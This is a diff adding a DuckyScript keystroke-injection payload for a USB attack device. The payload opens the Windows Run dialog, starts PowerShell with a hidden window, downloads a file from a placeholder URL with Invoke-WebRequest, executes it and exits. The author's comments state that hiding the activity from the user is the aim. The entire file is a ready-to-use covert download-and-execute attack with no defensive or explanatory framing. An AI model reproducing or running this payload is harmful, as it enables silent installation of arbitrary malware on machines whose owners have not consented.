@@ -1,0 +1,20 @@
+REM Edited by: Fahad Alkamli This is an improved version for the code above. In my opinion the user should see as minimum as possible so writing a whole line of code in the run is not discreet.
+
+REM open the Run 
+GUI r
+REM Change this value depending on the computer you are using ( i mean slow or not ) 
+DELAY 100
+STRING powershell -windowstyle hidden
+ENTER
+REM the shell usually takes a few  seconds to fully run so i put a delay just in case .
+DELAY 1000
+REM I just wanted to note that the file can be an EXE or JAR file doesn't really matter.
+REM in the destination if you put the fileName only, the file will be saved under C:\Users\LoggedInUser 
+STRING $source = "File URL "; $destination = "Path\FileName"; Invoke-WebRequest $source -OutFile $destination; 
+ENTER
+DELAY 5000
+STRING start-process FileName.EXE
+ENTER
+DELAY 100
+STRING exit
+ENTER
